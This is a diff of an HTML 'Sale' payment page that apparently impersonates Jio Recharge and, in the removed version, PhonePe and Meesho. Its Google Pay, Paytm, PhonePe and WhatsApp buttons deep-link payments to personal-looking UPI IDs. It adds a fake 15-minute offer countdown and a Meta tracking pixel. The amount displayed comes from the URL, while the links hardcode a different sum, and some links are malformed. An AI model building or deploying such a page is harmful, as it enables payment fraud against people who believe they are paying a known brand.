@@ -1,188 +1,154 @@
-<!DOCTYPE html>
+
 <html lang="en">
+
 <head>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1447206342660662');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1447206342660662&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
     <meta charset="UTF-8">
+    <link rel="icon" href="logo.png">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Page</title>
-    <!-- Include SweetAlert2 -->
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="assets/js/font-awesome-4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+    <link rel="stylesheet" href="assets/css/style.css">
+    <title>Sale</title>
 </head>
+
 <body>
-    <button style="height: 500px; width: 500px; background-color: red;" id="onBuyClicked">Continue</button>
+    <div class="bg-gray-200 font-sans">
+    <div class="image-container">
+      <img src="assets\action_bar1.png" width="1000" alt="Image 1">
+      
+    </div>
+    
+        <div>
+            <div class="text-center py-2 bg-white">
+
+                <span class="text-2xl font-semibold">Special Offer ends in : </span>
+                <div class="text-2xl text-orange-600" id='timer'></div>
+            </div>
+            
+
+            <div class="py-1 px-2 mt-1 ">
+                <div class="flex space-x-4 bg-white border border-gray-300 w-full p-2">
+                    <ul class="w-full">
+                        <li class="w-full my-2">
+                            <div class="flex items-center justify-center py-2 w-full font-sans">
+                                <span class="text-[16px] font-semibold mr-2">Total Payable Amount:</span> <span
+                                    id="offer-id"></span>
+                            </div>
+                        </li>
+                        <li class="w-full my-2">
+                            <a href="#" onclick="gpayclick()"
+                                class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
+                                <img src="assets/googlepayicon.svg" class="w-10" alt="" />
+                                <span class="ml-3 text-[14px]">Google Pay</span>
+                            </a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a href="#" onclick="paytmclick()"
+                                class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
+                                <img src="assets/paytm_icon.svg" class="w-10" alt="" />
+                                <span class="ml-3 text-lg">Paytm</span>
+                            </a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a href="#" onclick="phonepayclick()"
+                                class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
+                                <img src="assets/phonepeicon.svg" class="w-10" alt="" />
+                                <span class="ml-3 text-lg">PhonePe</span>
+                            </a>
+                        </li>
+                        <li class="w-full my-2">
+                            <a href="#" onclick="whatsappclick()"
+                                class="flex items-center border border-slate-200 py-2 px-6 rounded-xl w-full">
+                                <img src="assets/whatspp_pay.svg" class="w-10" alt="" />
+                                <span class="ml-3 text-[14px]">Whatsapp Pay</span>
+                            </a>
+                        </li>
+
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="image-container">
+      <img src="assets\Footer_payment.PNG" width="1000" alt="Image 1">
+      
+    </div>
+        </div>
+    </div>
 
     <script>
-        document.getElementById('onBuyClicked').addEventListener('click', function() {
-            onBuyClicked(10.00); // Example amount
-        });
+  var urlParams = new URLSearchParams(window.location.search);
+  var Id = urlParams.get('id');
 
-        function onBuyClicked(amount) {
-            // Uncomment and configure fbq if needed
-            // fbq('track', 'Purchase', {currency: "USD", value: amount});
-
-            if (!window.PaymentRequest || isUnsupportedBrowser()) {
-                fallbackPayment(amount);
-                return;
-            }
-
-            const supportedInstruments = [{
-                supportedMethods: ['https://tez.google.com/pay'],
-                data: {
-                    pa: 'mab.9038580374@axisbank',
-                    pn: 'Phonepe Recharge',
-                    tr: '1234ABCD',
-                    url: 'https://drigli.xyz/newtest',
-                    mc: '1234',
-                    tn: 'Purchase in Merchant',
-                },
-            }];
-
-            const details = {
-                total: {
-                    label: 'Total',
-                    amount: {
-                        currency: 'INR',
-                        value: amount,
-                    },
-                },
-                displayItems: [{
-                    label: 'Original Amount',
-                    amount: {
-                        currency: 'INR',
-                        value: amount,
-                    },
-                }],
-            };
-
-            let request;
-            try {
-                request = new PaymentRequest(supportedInstruments, details);
-            } catch (e) {
-                alert('Payment Request Error: ' + e.message);
-                return;
-            }
-
-            checkCanMakePayment(request).then((result) => {
-                showPaymentUI(request, result, amount);
-            }).catch((err) => {
-                alert('Error calling checkCanMakePayment: ' + err);
-            });
+  document.getElementById("offer-id").innerHTML = " " + Id;
+  
+  const upi ="shreenandanente348386.rzp@icici"
+  function gpayclick() {
+            const url = "tez://upi/pay?ver=01&mode=19&pa=vivophonenew839@okicici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge &am=10";
+            window.location.href = url;
+        }
+        
+        function phonepayclick() {
+            const url = "phonepe://pay?ver=01&mode=19&pa=vivophonenew839@okicici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to  Jio Recharge&am=10";
+            window.location.href = url;
+        }
+        function paytmclick() {
+            const url = "paytmmp://pay?ver=01&mode=19&pa=vivophonenew839@okicici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge&am=am=10";
+            window.location.href = url;
+        }
+        
+        function whatsappclick() {
+            const url = "whatsapp://pay?ver=01&mode=19&pa=vivophonenew839@okicici&pn=JIO RECHARGE&tr=RZPOvZfYp5UFvRLoRqrv2&cu=INR&mc=5399&qrMedium=04&tn=Payment to Jio Recharge&am=am=10" ;
+            window.location.href = url;
         }
 
-        function isUnsupportedBrowser() {
-            return isFacebookBrowser() || isSamsungBrowser() || isOperaMini() || isUCWebBrowser() || isIOS();
-        }
 
-        function checkCanMakePayment(request) {
-            const canMakePaymentCache = 'canMakePaymentCache';
+</script>
 
-            if (sessionStorage.getItem(canMakePaymentCache)) {
-                return Promise.resolve(JSON.parse(sessionStorage.getItem(canMakePaymentCache)));
-            }
+    
+    
+     <script>
+        let minutes = 15;
+        let seconds = 0;
 
-            let canMakePaymentPromise = Promise.resolve(true);
+        const countdown = setInterval(() => {
+            const timerElement = document.getElementById('timer');
 
-            if (request.canMakePayment) {
-                canMakePaymentPromise = request.canMakePayment();
-            }
-
-            return canMakePaymentPromise.then((result) => {
-                sessionStorage.setItem(canMakePaymentCache, JSON.stringify(result));
-                return result;
-            }).catch((err) => {
-                alert('Error calling canMakePayment: ' + err);
-            });
-        }
-
-        function showPaymentUI(request, canMakePayment, amount) {
-            if (!canMakePayment) {
-                fallbackPayment(amount);
-                return;
-            }
-
-            const paymentTimeout = window.setTimeout(() => {
-                window.clearTimeout(paymentTimeout);
-                request.abort().then(() => {
-                    alert('Payment timed out.');
-                }).catch(() => {
-                    alert('Unable to abort, user is in the process of paying.');
-                });
-            }, 20 * 60 * 1000);
-
-            request.show().then((instrument) => {
-                window.clearTimeout(paymentTimeout);
-                processResponse(instrument);
-            }).catch((err) => {
-                alert(err);
-            });
-        }
-
-        function processResponse(instrument) {
-            const instrumentString = JSON.stringify({
-                methodName: instrument.methodName,
-                details: instrument.details,
-                payerName: instrument.payerName,
-                payerPhone: instrument.payerPhone,
-                payerEmail: instrument.payerEmail,
-            }, null, 2);
-
-            fetch('process_payment.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: instrumentString,
-            }).then(response => response.json()).then(data => {
-                if (data.success) {
-                    window.location.href = 'payment_success.php';
-                } else {
-                    Swal.fire('Payment failed', 'There was an issue with the payment. Please try again.', 'error');
+            if (seconds === 0) {
+                if (minutes === 0) {
+                    clearInterval(countdown);
+                    timerElement.textContent = "Countdown ended!";
+                    return;
                 }
-            }).catch(error => console.error('Error:', error));
+                minutes--;
+                seconds = 59;
+            } else {
+                seconds--;
+            }
 
-            instrument.complete('success');
-        }
+            timerElement.textContent = `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+        }, 1000);
 
-        function fallbackPayment(amount) {
-            const upiId = 'mab.9038580374@axisbank';
-            const redirect_url = `paytmmp://cash_wallet?pa=${upiId}&pn=Meesho_Payments&am=${amount}&cu=INR&tn=4520175&featuretype=money_transfer`;
+        
 
-            window.location.href = redirect_url;
-        }
-
-        function isFacebookBrowser() {
-            const ua = navigator.userAgent || navigator.vendor || window.opera;
-            return ua.includes('FBAN') || ua.includes('FBAV');
-        }
-
-        function isSamsungBrowser() {
-            return navigator.userAgent.toLowerCase().includes('samsungbrowser');
-        }
-
-        function isOperaMini() {
-            return navigator.userAgent.toLowerCase().includes('opera mini');
-        }
-
-        function isUCWebBrowser() {
-            return navigator.userAgent.toLowerCase().includes('ucbrowser');
-        }
-
-        function isIOS() {
-            return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
-        }
-
-        // Define fetchUpiID and setRechargeOnClick if they are required
-        function fetchUpiID() {
-            // Placeholder function; implement according to your needs
-            return Promise.resolve('some-upi-id');
-        }
-
-        function setRechargeOnClick(upiID) {
-            // Placeholder function; implement according to your needs
-            console.log('UPI ID set:', upiID);
-        }
-
-        // Fetch UPI ID and set up the onclick handlers
-        fetchUpiID().then(upiID => setRechargeOnClick(upiID));
     </script>
 </body>
+
 </html>
